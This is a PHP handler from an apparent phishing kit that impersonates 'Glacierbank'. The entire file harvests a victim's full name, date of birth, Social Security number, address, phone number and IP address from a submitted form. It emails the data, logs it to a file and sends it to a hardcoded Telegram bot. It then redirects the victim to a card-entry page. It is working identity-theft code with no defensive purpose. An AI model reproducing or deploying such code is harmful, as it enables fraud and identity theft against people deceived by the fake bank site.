<?php

$ZoRo = getenv("REMOTE_ADDR");

$ip = $_SERVER['REMOTE_ADDR'];

include('./XEmail.php');

$subject = "Glacierbank Fullz";
$headers = "From: SuleimanSamar <Glacierbank>\r\n";
$message .= "
+----/!\----<.![+] Glacierbank Fullz  [+]!.>---/!\----+
 [IP]             : ".$ip."
 [FullName]       : ".$_POST['FullName']."
 [DOB]            : ".$_POST['DOB']."
 [SSN]            : ".$_POST['ssn']."
 [Add1]           : ".$_POST['add1']."
 [Add2]           : ".$_POST['add2']."
 [City]           : ".$_POST['city']."
 [Zip Code]       : ".$_POST['zip']."
 [Phone Number]   : ".$_POST['phone']."
-------------------------------------------------\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);

/* Telegram */
function sendMessage($messaggio) {
    $token = '2104282985:AAEV0Q0Kz0NZI4QIq2xrjJgWeGxZEKUA2SA';
    $chatid = '1275453727';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: ../Main/Card.html");

?>